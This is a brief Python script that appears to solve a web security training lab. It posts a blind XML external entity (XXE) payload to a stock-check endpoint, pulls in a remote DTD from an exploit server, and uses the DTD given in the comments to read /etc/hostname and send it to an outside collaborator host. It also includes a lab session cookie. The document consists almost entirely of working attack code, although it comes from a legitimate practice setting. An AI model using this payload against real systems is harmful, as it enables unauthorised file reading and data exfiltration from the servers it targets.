import requests

url = "https://0ae1009104c30f39c0123bbe006d00b6.web-security-academy.net/product/stock"

cookies = {
	"session": "C26f777ATG6yD5teAFlqMcOX9ydEQrM5"
}

payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
	<!ENTITY % xxe SYSTEM "https://exploit-0a1600b1047e0fdac03b3b4a016400e8.exploit-server.net/exploit">
	%xxe;
]>
<stockCheck>
<productId>1</productId>
<storeId>1</storeId>
</stockCheck>"""


r = requests.post(url, data=payload, cookies=cookies)

print(r.text)

# in Exploit server body
# <!ENTITY % file SYSTEM "file:///etc/hostname">
# <!ENTITY % show "<!ENTITY &#x25; connect SYSTEM 'http://2ad66wh1nc4aolvdofbor75sljrafz.burpcollaborator.net/?x=%file;'>">
# %show;
# %connect;